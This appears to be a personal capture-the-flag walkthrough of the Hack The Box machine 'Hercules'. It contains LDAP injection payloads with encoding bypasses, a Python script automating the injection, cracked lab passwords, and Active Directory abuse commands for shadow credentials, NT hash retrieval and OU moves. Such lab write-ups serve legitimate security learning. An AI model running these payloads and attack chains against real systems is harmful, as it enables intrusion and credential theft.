![[Pasted_image_20251103075242.png]]

### Port Scan

```bash
sudo nmap -Pn  -sCV -oN hercules-port-scan 10.10.11.91
[sudo] password for darklight:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 07:49 EAT
Nmap scan report for hercules.htb (10.10.11.91)
Host is up (0.29s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://hercules.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-03 04:49:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Hercules Corp
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_http-title: Not Found
|_ssl-date: TLS randomness does not represent time
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-11-03T04:50:56
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.29 seconds
```

We have NTLM authentication disabled and message signing is enabled.

```bash
nxc smb dc.hercules.htb
SMB         10.10.11.91     445    10.10.11.91      [*]  x64 (name:10.10.11.91) (domain:10.10.11.91) (signing:True) (SMBv1:False) (NTLM:False)
```

We could do much since we don' have any credentials and  the `quest` account is disabled.

### Web Service

![[Pasted_image_20251103080951.png]]

We have a working contact form at the bottom of the page 

![[Pasted_image_20251103081034.png]]

Performing a directory fuzzing i get this

```bash
ffuf -u https://hercules.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -c -e .asp

[SNIP]

Home                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 333ms]
Index                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 245ms]
Login                   [Status: 200, Size: 3213, Words: 927, Lines: 54, Duration: 439ms]
Content                 [Status: 301, Size: 152, Words: 9, Lines: 2, Duration: 308ms]
INDEX                   [Status: 200, Size: 27342, Words: 10179, Lines: 468, Duration: 230ms]
HOME                    [Status: 302, Size: 141, Words: 6, Lines: 4, Duration: 231ms]
```

We have a login form at `/login`

![[Pasted_image_20251103081506.png]]

With failed login attempt we get this error message 

![[Pasted_image_20251103085251.png]]

Clicking the `?` button i get this 

![[Pasted_image_20251103081619.png]]

After 10 failed login attempts we get this 
![[Pasted_image_20251103082051.png]]

We are blocked for `30 sec`

### LDAP Injection 

> [!question]
> #### What is LDAP Injection?
> 
> **LDAP** (Lightweight Directory Access Protocol) injection is a technique that exploits vulnerabilities in applications using LDAP for authentication, authorization, or directory searches. It occurs when an application fails to properly sanitize or validate user-supplied input before incorporating it into an LDAP query. This allows attackers to manipulate the query's logic, potentially bypassing security controls, retrieving unauthorized data, or executing arbitrary commands on the LDAP server.
> 
> Similar to SQL injection, LDAP injection targets the structure of LDAP filters (queries), which use special metacharacters like parentheses (), asterisk * (wildcard), ampersand & (AND operator), pipe | (OR operator), and negation !. If untrusted input is concatenated directly into these filters without escaping, attackers can inject malicious strings to alter the query's intended behavior.
> 
> LDAP is commonly used in enterprise environments for managing user credentials, roles, and resources in directories like Active Directory or OpenLDAP. Vulnerabilities often arise in web applications handling logins, searches, or access controls.

#### Authentication Bypass

You can find some payloads and such [here](https://book.hacktricks.wiki/en/pentesting-web/ldap-injection.html)

Passing this as the username `(&(objectClass=user)(uid=*))` we get a new error message 

![[Pasted_image_20251103091542.png]]


But that filter will be the resulting filter after our input has been pursed. For example when passing a username and password the constructed filter will be something like this `(&(uid=jdoe)(userPassword=secret))` 

So if we pass this as the username `*)(uid=*` we will have query like `(&(uid=*)(uid=*)(userPassword=<supplied password>))` which will return any user that has the supplied password .

Passing the value of password as `*` and username as `*)(uid=*` would result to a query like `(&(uid=*)(uid=*)(userPassword=*))` which will return any user with any password. this one fails too with the error `Invalid username`

PayloadAllThings has other payload we can test for authentication bypass. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection

Testing payload `*)(uid=*))(|(uid=*` in the username and any password in the password field fails even though the resulting query is `(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))` which always returns true.

Inspecting the request i get this.

```html
<input class="input-validation-error form-control" data-val="true" data-val-regex="Invalid Username" data-val-regex-pattern="^[^!&quot;#&amp;&#39;()*+,\:;&lt;=>?[\]^`{|}~]+$" data-val-required="The Username field is required." id="Username" name="Username" type="text" value="" />
<span class="field-validation-error text-danger" data-valmsg-for="Username" data-valmsg-replace="true">Invalid Username</span>
```

i think this breaks our payload. 

It filter this characters 
```
!"#'()*+,:;<=>?[\]^`{|}~
```

Submitting this  `*)(uid=*` and capturing the request in burp, i didn't see nay character being filtered out of our payload.

URL encoding this payload `*)(uid=*`, to `%2A%29%28uid%3D%2A` give me this error.

![[Pasted_image_20251103125738.png]]

Meaning we bypassed the username check. and the error is a result of an invalid password "i think" ?

Trying the same with `*)(uid=*))(|(uid=*`, (url encoded: `%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A`) which should bypass authentication check gives me no error message and am not logged in. double encoding it to `%252A%2529%2528uid%253D%252A%2529%2529%2528%257C%2528uid%253D%252A` i get this

![[Pasted_image_20251103132529.png]]

.

Wait a minute passing a valid username, `will.s` and invalid password i get this 

![[Pasted_image_20251103143625.png]]

In this case, this is the error when we get a valid username. 

With LDAP we can also query the description of users, which usually contains valuable information about the user and sometimes the password of the user.


#### Retrieve the Description of a user account.

##### Step 1 : Getting valid users

We can use `kerbrute`  to enumerate users.

```bash
kerbrute userenum --dc dc.hercules.htb -d hercules.htb /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100
```

We get the following usernames:

```
admin
administrator
auditor
will.s
```

The last name gives us a possible name format being used. We can extend our user list by creating a username file with that format.

```python
import string

USERNAME_FILE = '/usr/share/wordlists/SecLists/Usernames/Names/names.txt'
OUT_FILE = 'formatted-usernames.txt'

with open(USERNAME_FILE, "r", encoding="utf-8") as infile, open(OUT_FILE, "w", encoding="utf-8") as outfile:
    for line in infile:
        username = line.strip()
        if not username:
            continue
        for ch in string.ascii_lowercase:  # a-z
            outfile.write(f"{username}.{ch}\n")
```

Found more usernames

```bash
kerbrute userenum --dc dc.hercules.htb -d hercules.htb formatted-usernames.txt -t 100

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - 11/03/25 - Ronnie Flathers @ropnop

2025/11/03 12:16:16 >  Using KDC(s):
2025/11/03 12:16:16 >  	dc.hercules.htb:88

2025/11/03 12:17:28 >  [+] VALID USERNAME:	adriana.i@hercules.htb
2025/11/03 12:21:54 >  [+] VALID USERNAME:	angelo.o@hercules.htb
2025/11/03 12:24:53 >  [+] VALID USERNAME:	ashley.b@hercules.htb
2025/11/03 12:29:56 >  [+] VALID USERNAME:	bob.w@hercules.htb
2025/11/03 12:33:10 >  [+] VALID USERNAME:	camilla.b@hercules.htb
2025/11/03 12:38:46 >  [+] VALID USERNAME:	clarissa.c@hercules.htb
2025/11/03 12:49:19 >  [+] VALID USERNAME:	elijah.m@hercules.htb
2025/11/03 12:54:36 >  [+] VALID USERNAME:	fiona.c@hercules.htb
2025/11/03 13:01:50 >  [+] VALID USERNAME:	harris.d@hercules.htb
2025/11/03 13:01:59 >  [+] VALID USERNAME:	heather.s@hercules.htb
2025/11/03 13:06:50 >  [+] VALID USERNAME:	jacob.b@hercules.htb
2025/11/03 13:09:47 >  [+] VALID USERNAME:	jennifer.a@hercules.htb
2025/11/03 13:10:15 >  [+] VALID USERNAME:	jessica.e@hercules.htb
2025/11/03 13:11:13 >  [+] VALID USERNAME:	joel.c@hercules.htb
2025/11/03 13:11:20 >  [+] VALID USERNAME:	johanna.f@hercules.htb
2025/11/03 13:11:26 >  [+] VALID USERNAME:	johnathan.j@hercules.htb
2025/11/03 13:16:11 >  [+] VALID USERNAME:	ken.w@hercules.htb
2025/11/03 13:27:43 >  [+] VALID USERNAME:	mark.s@hercules.htb
2025/11/03 13:31:12 >  [+] VALID USERNAME:	mikayla.a@hercules.htb
2025/11/03 14:00:01 >  [+] VALID USERNAME:	natalie.a@hercules.htb
2025/11/03 14:00:11 >  [+] VALID USERNAME:	nate.h@hercules.htb
2025/11/03 14:10:22 >  [+] VALID USERNAME:	patrick.s@hercules.htb
2025/11/03 14:15:20 >  [+] VALID USERNAME:	ramona.l@hercules.htb
2025/11/03 14:16:00 >  [+] VALID USERNAME:	ray.n@hercules.htb
2025/11/03 14:16:59 >  [+] VALID USERNAME:	rene.s@hercules.htb
2025/11/03 14:25:05 >  [+] VALID USERNAME:	shae.j@hercules.htb
2025/11/03 14:30:32 >  [+] VALID USERNAME:	stephanie.w@hercules.htb
2025/11/03 14:30:34 >  [+] VALID USERNAME:	stephen.m@hercules.htb
2025/11/03 14:32:47 >  [+] VALID USERNAME:	tanya.r@hercules.htb
2025/11/03 14:35:39 >  [+] VALID USERNAME:	tish.c@hercules.htb
2025/11/03 14:39:28 >  [+] VALID USERNAME:	vincent.g@hercules.htb
2025/11/03 14:41:24 >  [+] VALID USERNAME:	will.s@hercules.htb
2025/11/03 14:44:34 >  [+] VALID USERNAME:	zeke.s@hercules.htb
```

##### Step 2 : Determine if the user has a description 

In the case of `will.s` we can use `will.s*)(description=*`  but we need to double url encode this `*)(description=*)` which give this `%252A%2529%2528description%253D%252A%2529` so our payload is 

```
will.s%252A%2529%2528description%253D%252A%2529
```

Theory : If the user has a description we will get error  `Login attempt failed`. If the user does not have a description we will get `invalid login attempt` After that then we can bruteforce the description by checking one character at a time


### Day Two
Been working on the script.

Build the script to automate the whole process

```python
#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import urllib3
from urllib.parse import quote


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE_URL          = "https://hercules.htb"
LOGIN_URI         = "/login"
LOGIN_URL         = BASE_URL + LOGIN_URI
VERIFY_TLS        = False
SUCCESS_INDICATOR = "Login attempt failed"
users_with_desc = []


# Double-URL-encode helper
double_encode = lambda s: quote(quote(s))

USERNAMES = [
    "admin", "administrator", "auditor", "adriana.i", "angelo.o", "ashley.b",
    "bob.w", "camilla.b", "clarissa.c", "elijah.m", "fiona.c", "harris.d",
    "heather.s", "jacob.b", "jennifer.a", "jessica.e", "joel.c", "johanna.f",
    "johnathan.j", "ken.w", "mark.s", "mikayla.a", "natalie.a", "nate.h",
    "patrick.s", "ramona.l", "ray.n", "rene.s", "shae.j", "stephanie.w",
    "stephen.m", "tanya.r", "tish.c", "vincent.g", "will.s", "zeke.s"
]

def get_token_and_cookie(session: requests.Session) -> str | None:
    """Fetch the hidden __RequestVerificationToken from the login page."""
    try:
        res = session.get(LOGIN_URL, verify=VERIFY_TLS, timeout=10)
        res.raise_for_status()
    except Exception as e:
        print(f"[!] Token request failed: {e}")
        return None

    soup = BeautifulSoup(res.text, "html.parser")
    token_input = soup.find("input", {"name": "__RequestVerificationToken"})
    return token_input["value"] if token_input else None


def ldap_injection(username: str) -> bool:
    """Try the LDAP injection payload and return True if the user has a description."""
    s = requests.Session()

    token = get_token_and_cookie(s)
    if not token:
        return False

    payload = f"{username}*)(description=*"
    #encoded_payload = double_encode(payload)
    encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))

    #print(f"[->] payload: {payload}")
    #print(f"[->] encoded : {encoded_payload}")

    data = {
        "Username": encoded_payload,
        "Password": "password",
        "RememberMe": "false",
        "__RequestVerificationToken": token
    }

    try:
        resp = s.post(LOGIN_URL,data=data,verify=VERIFY_TLS,timeout=10 )

        return SUCCESS_INDICATOR in resp.text

    except requests.RequestException as e:
        print(f"[!] POST failed for {username}: {e}")
        return False

def main() -> None:
    print("-" * 60)
    print("Bruteforcing user descriptions...")
    print(f"Bruteforcing {len(USERNAMES)} users.")
    print("-" * 60)

    for name in USERNAMES:
        print(f"\n[+] Checking user: {name}")
        has_desc = ldap_injection(name)

        if has_desc:
            users_with_desc.append(name)
            print(f"[+] User: {name} has a description.")
        else:
            print(f"[-] User: {name} has no description.")

    print("\n")
    print("-" * 60)
    print("Bruforcing Completed.")
    print(f"{len(users_with_desc)} users has a description.")
    print("\nUsers are:")
    for user in users_with_desc:
        print(user)
    print("-" * 60)

if __name__ == "__main__":
    main()
```


![[Pasted_image_20251104095209.png]]

The double encoding didn't work but single encoding all the characters works.

Now we have one user with a description. We can write a script to bruteforce the description.


i'm sorry... I know you like the thrill of this all.. 
AM preparing for CRTA exam, so i will kinda fast forward to the part where we do AD.
If you are wondering who am sorry to, I'm sorry to myself.

But i will give a brie of what happened.

> [!summary]
> The description field had this password `change*th1s_p@ssw()rd!!` working for `ken.w` in the web application... we then exploited LFI to read the `web.config` file with gave us the `machine keys` which we use to forge a cookie to get admin privileges in the web application. Then we exploit a file upload vulnerability that leads to getting `NTLMv2` hash for `natalie.a`  which is cracked to get the password `Prettyprincess123!`

That is what happened in a nutshell .. and yes I am using a writeup, but for this AD part I will give it my best shot before opening the write up... Don't worry we will find time to do all those steps we have jumped.


## Active Directory

First of all we need to dump all the AD data for mapping in bloodhound.

For collection method you can use `bloodhound-ce-python`, Just discovered `rusthound-ce` i think it collect even certificate templates unlike `bloodhound-ce-python`

```bash
┌──(darklight㉿ataraxia)-[~/…/htb/machines/hercules/AD]
└─$ nxc smb dc.hercules.htb -u 'natalie.a' -p 'Prettyprincess123!' -k --generate-krb5-file hercules.krb5
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] hercules.htb\natalie.a:Prettyprincess123!

┌──(darklight㉿ataraxia)-[~/…/htb/machines/hercules/AD]
└─$ sudo cp hercules.krb5 /etc/krb5.conf
[sudo] password for darklight:

┌──(darklight㉿ataraxia)-[~/…/htb/machines/hercules/AD]
└─$ impacket-getTGT hercules.htb/natalie.a:'Prettyprincess123!' -k -dc-ip 10.10.11.91
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in natalie.a.ccache

┌──(darklight㉿ataraxia)-[~/…/htb/machines/hercules/AD]
└─$ export KRB5CCNAME=natalie.a.ccache

┌──(darklight㉿ataraxia)-[~/…/htb/machines/hercules/AD]
└─$ rusthound-ce -u 'natalie.a' -p 'Prettyprincess123!' -k -d hercules.htb -n 10.10.11.91 -f dc.hercules.htb
---------------------------------------------------
Initializing RustHound-CE at 07:45:28 on 11/05/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-11-05T04:45:28Z INFO  rusthound_ce] Verbosity level: Info
[2025-11-05T04:45:28Z INFO  rusthound_ce] Collection method: All
[2025-11-05T04:45:32Z INFO  rusthound_ce::ldap] Connected to HERCULES.HTB Active Directory!
[2025-11-05T04:45:32Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-11-05T04:45:33Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-05T04:45:39Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hercules,DC=htb
[2025-11-05T04:45:39Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-05T04:45:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hercules,DC=htb
[2025-11-05T04:45:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-05T04:46:21Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hercules,DC=htb
[2025-11-05T04:46:21Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-05T04:46:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hercules,DC=htb
[2025-11-05T04:46:22Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-11-05T04:46:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hercules,DC=htb
[2025-11-05T04:46:22Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⠠ Parsing LDAP objects: 43%[2025-11-05T04:46:23Z INFO  rusthound_ce::objects::enterpriseca] Found 18 enabled certificate templates
[2025-11-05T04:46:23Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 49 users parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_users.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_groups.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_computers.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 9 ous parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_ous.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_domains.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_gpos.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_containers.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_ntauthstores.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_aiacas.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_rootcas.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_enterprisecas.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_certtemplates.json created!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-11-05T04:46:23Z INFO  rusthound_ce::json::maker::common] .//20251105074623_hercules-htb_issuancepolicies.json created!

RustHound-CE Enumeration Completed at 07:46:23 on 11/05/25! Happy Graphing!
```

Start bloodhound and upload the files

`Natalie.a` has `GenericWrite` rights over some users more on abusing `GenericWrite` check this https://www.hackingarticles.in/genericwrite-active-directory-abuse/

![[Pasted_image_20251105080529.png]]

`bob.w` is a member if `recruitment` group.

![[Pasted_image_20251106073547.png]]


All the other users that we have `genericWrite` permissions over them are in just tow groups  `domainUsers` and `users` except for `web_admin` who is a member of `Domain Empployees` but that is not of interest since `natalie.a` is also a member of the group.

In bloodhound there is no direct clue of what we can do with `bob.w` but we know that bloodhound does not show everything.

#### Getting NT hash for `bob.w`

First we add shadow credentials to the account which will result to us having a certificate fro the user.

```bash
certipy-ad shadow add -account 'bob.w' -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -k
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'bob.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7102b451e93045b2a853d95ba37d2220'
[*] Adding Key Credential with device ID '7102b451e93045b2a853d95ba37d2220' to the Key Credentials for 'bob.w'
[*] Successfully added Key Credential with device ID '7102b451e93045b2a853d95ba37d2220' to the Key Credentials for 'bob.w'
[*] Saving certificate and private key to 'bob.w.pfx'
[*] Saved certificate and private key to 'bob.w.pfx'
```

Then we auth using the certificate to get the NT hash for the user.

```bash
certipy-ad auth -pfx bob.w.pfx -domain hercules.htb -dc-ip 10.10.11.91 -username bob.w
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'bob.w@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bob.w.ccache'
[*] Wrote credential cache to 'bob.w.ccache'
[*] Trying to retrieve NT hash for 'bob.w'
[*] Got hash for 'bob.w@hercules.htb': aad3b435b51404eeaad3b435b51404ee:8a65c74e8f0073babbfac6725c66cc3f
```

With the NT hash we can get a TGT then enumerate the user's `writables`

```bash
impacket-getTGT hercules.htb/bob.w -hashes aad3b435b51404eeaad3b435b51404ee:8a65c74e8f0073babbfac6725c66cc3f -k -no-pass -dc-ip 10.10.11.91
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in bob.w.ccache

┌──(darklight㉿ataraxia)-[~/…/htb/machines/hercules/AD]
└─$ export KRB5CCNAME=bob.w.ccache
```


Getting `writables`


```bash
bloodyAD -d hercules.htb --host dc.hercules.htb -k get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD
msImaging-PSPs: CREATE_CHILD
msCOM-PartitionSet: CREATE_CHILD
remoteStorageServicePoint: CREATE_CHILD
nTFRSSettings: CREATE_CHILD
remoteMailRecipient: CREATE_CHILD
msTAPI-RtConference: CREATE_CHILD
inetOrgPerson: CREATE_CHILD

[SNIP]
```

We have `CREATE_CHILD` on several OUs `Engineering Department`,  `Engineering Department`, and `Security department` 

We can create users shown by the entry `user: CREATE_CHILD`, groups shown by `group: CREATE_CHILD`, basically we have the rights to create several objects in each OU, we are not limited to users and groups but those two are of interest.


> [!question]
> #### What is an OU ?
> 
> An **Organizational Unit (OU)** in Active Directory (AD) is a container object used to organize and manage network resources such as users, computers, groups, and other OUs within a domain.
> An Organizational Unit (OU) itself does **not** grant any permissions or rights to users simply by their membership in it. Being in an OU does not give a user special access to resources or privileges.
> 
> The primary function of an OU is organizational and administrative:
> 
> - It allows administrators to logically group users, computers, and other objects.
> - It enables delegation of administrative control, meaning specific users or groups can be granted the right to manage objects within that OU (e.g., reset passwords, create users).
> - It is used to apply Group Policy Objects (GPOs) to a targeted set of users or computers.
> 
> So, a user being in a specific OU has no inherent rights, but the OU can be used so that a different user (like a helpdesk technician) can be allowed to manage that user’s account. 
> 


With that knowledge we know that we creating new users is useless in this case. But `CREATE_CHILD` combined with `DELETE_CHILD` right gives us the privilege to move a user from one OU to another.

But from the output of `bloodyAD` we just see `CREATE_CHILD` nothing points to deleting a user from an OU.

This is where `powerview.py` comes in.

`PowerView.py` is an alternative for the awesome original [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) script. Most of the modules used in `PowerView` are available here ( some of the flags are changed ). Main goal is to achieve interactive session without having to repeatedly authenticate to LDAP. 

With it basically we can run `powerview` commands from a Linux host.

https://github.com/aniqfakhrul/powerview.py

```bash
powerview hercules.htb/bob.w@dc.hercules.htb -k --no-pass -k --dc-ip 10.10.11.91
Logging directory is set to /home/darklight/.powerview/logs/hercules-bob.w-dc.hercules.htb
╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─ ❯
```


First we need to identify OU of interest and it's users.

`EGINEERIGN DEPARTMENT` has the following users. No user is of interest since all users are in the in the following groups `Domain users`, `Domain Employees` and `Users`

![[Pasted_image_20251106103054.png]]


`SECURITY DEPARTMENT` has the following users

![[Pasted_image_20251106103435.png]]

We have several users of interest :

- `AUDITOR` member of `remote management` and `forest managemt` and the other 3 default groups `domain users`, `users`, `domain employees`
- `STEPHEN.M` member of `security helpdesk` and the other 3 groups
- `VINCENT.G` member of `forest managemnt` and the other 3 groups
- `MARK.S` member of `security helpdesk` and the other 3
- `NATE.H` member of `forest management` and the other 3

`Forest Management` Group does not seem to have any special rights based on bloodhound but the name suggest it might be of use if we have several domains in a forest.

`Security Helpdesk` group has `forceChangePassword` rights over the following users

![[Pasted_image_20251106104411.png]]

The group has just two members, as identified earlier

![[Pasted_image_20251106104527.png]]


`WEB DEPARTMENT` has the following user, but none seem interesting

![[Pasted_image_20251106104657.png]]

This OU is of interest since we know that `natalie.a` has generic write over it. If we are to move a user like `auditor` or `stephen.m` from the security department OU to this OU (ie modifying the objects DN) then we would end up having `genericWrite` rights over the user. Then we can create shadow credentials for the user fully compromising the user

But to do that we need to know if we have `DELETE_CHILD` rights on the `Security Department`

```powershell
─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]-[NS:<auto>]
╰─ ❯ Get-ObjectAcl "OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" -ResolveGUIDs | ?{$_.IdentityReference -like "*bob.wood*" -and $_.ActiveDirectoryRights -match "CreateChild" -and $_.ObjectType -match "user"} | Format-Table IdentityReference, ActiveDirectoryRights, ObjectType, InheritedObjectType -AutoSize

ObjectDN                    : OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
ObjectSID                   : None
ACEType                     : ACCESS_ALLOWED_OBJECT_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE
AccessMask                  : ControlAccess
ObjectAceFlags              : ACE_OBJECT_TYPE_PRESENT
ObjectAceType               : User-Force-Change-Password
InheritanceType             : None
SecurityIdentifier          : HERCULES\Security Helpdesk

[SNIP]

ObjectDN                    : OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
ObjectSID                   : None
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : DeleteChild,CreateChild
AccessMask                  : DeleteChild,CreateChild
InheritanceType             : None
SecurityIdentifier          : HERCULES\Recruitment Managers

[SNIP]
```

`RECRUITMENT MANAGERS` group has both `deletechild` and `CreateChild` rights meaning any user in the group can  create and delete objects from the security department OU. And guess what ... `bob.w` is a member of the group.


```powershell
Set-DomainObjectDN -Identity auditor -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
